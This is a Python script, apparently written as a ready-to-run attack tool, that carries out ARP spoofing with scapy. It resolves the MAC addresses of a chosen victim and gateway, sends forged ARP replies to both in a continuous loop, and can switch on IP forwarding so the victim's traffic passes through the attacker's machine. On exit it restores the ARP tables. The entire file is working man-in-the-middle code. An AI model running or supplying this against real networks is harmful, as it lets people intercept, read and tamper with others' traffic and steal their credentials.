#!/usr/bin/env python3

import argparse
import sys
import time
import threading
import signal
from scapy.all import ARP, Ether, send, sr1, conf, get_if_hwaddr
_running = True
_poison_thread = None

def parse_args():
    p = argparse.ArgumentParser(description="ARP spoof (poison victim and gateway).")
    p.add_argument("-v", "--victim-ip", required=True, help="Victim IP address")
    p.add_argument("-g", "--gateway-ip", required=True, help="Gateway IP address (usually default gateway)")
    p.add_argument("-i", "--iface", required=True, help="Interface to use (e.g. v-att)")
    p.add_argument("--enable-forwarding", action="store_true", help="Enable IP forwarding on this host")
    p.add_argument("--disable-forwarding", action="store_true", help="Disable IP forwarding on this host")
    p.add_argument("--interval", type=float, default=2.0, help="Seconds between ARP poison packets (default 2.0)")
    p.add_argument("--verbose", "-V", action="store_true", help="Verbose output")
    p.add_argument("--restore-timeout", type=float, default=3.0, help="Seconds to wait when restoring ARP (default 3)")
    return p.parse_args()

def enable_ip_forward(enable=True):
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1\n" if enable else "0\n")
    except Exception as e:
        print(f"[!] Failed to set ip_forward={enable}: {e}")

def get_mac(ip, iface, timeout=2):
    ans = sr1(ARP(op=1, pdst=ip), iface=iface, timeout=timeout, verbose=0)
    if ans is None:
        return None
    return ans.hwsrc

def poison_target(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface, interval=2.0, verbose=False):
    if verbose:
        print(f"[+] Starting poisoning loop: victim {victim_ip} <- attacker ({attacker_mac}) pretending to be gw {gateway_ip}")
        print(f"[+] Gateway {gateway_ip} <- attacker ({attacker_mac}) pretending to be victim {victim_ip}")
    arp_to_victim = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=attacker_mac)
    arp_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=attacker_mac)

    while _running:
        send(arp_to_victim, iface=iface, verbose=0)
        send(arp_to_gateway, iface=iface, verbose=0)
        if verbose:
            print(f"[.] Sent spoofed ARP to {victim_ip} and {gateway_ip}")
        time.sleep(interval)

def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface, timeout=3.0, verbose=False):
    if verbose:
        print("[*] Restoring ARP tables to correct mappings...")
    arp_restore_victim = ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=gateway_mac)
    arp_restore_gateway = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=victim_ip, hwsrc=victim_mac)

    for i in range(int(timeout)):
        send(arp_restore_victim, iface=iface, verbose=0)
        send(arp_restore_gateway, iface=iface, verbose=0)
        if verbose:
            print(f"[.] Sent restore broadcast ({i+1}/{int(timeout)})")
        time.sleep(1)

def signal_handler(sig, frame, args, victim_mac, gateway_mac, attacker_mac):
    global _running
    print("\n[!] Caught signal, stopping and restoring ARP...")
    _running = False
    time.sleep(0.5)
    restore_arp(args.victim_ip, victim_mac, args.gateway_ip, gateway_mac, args.iface, timeout=args.restore_timeout, verbose=args.verbose)
    if args.disable_forwarding:
        enable_ip_forward(False)
        if args.verbose: print("[*] Disabled IP forwarding.")
    print("[*] Done. Exiting.")
    sys.exit(0)

def main():
    global _poison_thread, _running
    args = parse_args()

    conf.iface = args.iface

    if not hasattr(conf, 'root') and os.geteuid() != 0:
        pass

    if args.enable_forwarding:
        enable_ip_forward(True)
        if args.verbose: print("[*] IP forwarding enabled.")
    if args.disable_forwarding:
        enable_ip_forward(False)
        if args.verbose: print("[*] IP forwarding disabled.")

    if args.verbose: print(f"[*] Resolving MAC for victim {args.victim_ip} ...")
    victim_mac = get_mac(args.victim_ip, args.iface)
    if victim_mac is None:
        print(f"[!] Could not resolve victim MAC for {args.victim_ip}. Exiting.")
        sys.exit(1)
    if args.verbose: print(f"[*] Victim MAC: {victim_mac}")

    if args.verbose: print(f"[*] Resolving MAC for gateway {args.gateway_ip} ...")
    gateway_mac = get_mac(args.gateway_ip, args.iface)
    if gateway_mac is None:
        print(f"[!] Could not resolve gateway MAC for {args.gateway_ip}. Exiting.")
        sys.exit(1)
    if args.verbose: print(f"[*] Gateway MAC: {gateway_mac}")

    attacker_mac = get_if_hwaddr(args.iface)
    if args.verbose: print(f"[*] Attacker interface {args.iface} MAC: {attacker_mac}")

    def _sig(sig, frame):
        signal_handler(sig, frame, args, victim_mac, gateway_mac, attacker_mac)
    signal.signal(signal.SIGINT, _sig)
    signal.signal(signal.SIGTERM, _sig)

    _running = True
    _poison_thread = threading.Thread(
        target=poison_target,
        args=(args.victim_ip, victim_mac, args.gateway_ip, gateway_mac, attacker_mac, args.iface, args.interval, args.verbose),
        daemon=True
    )
    _poison_thread.start()

    print(f"[+] ARP poisoning started. Victim: {args.victim_ip} <-> Gateway: {args.gateway_ip}")
    print("[+] Press Ctrl+C to stop and restore ARP tables.")
    try:
        while _running:
            time.sleep(1)
    except KeyboardInterrupt:
        _sig(None, None)

if __name__ == "__main__":
    import os
    main()
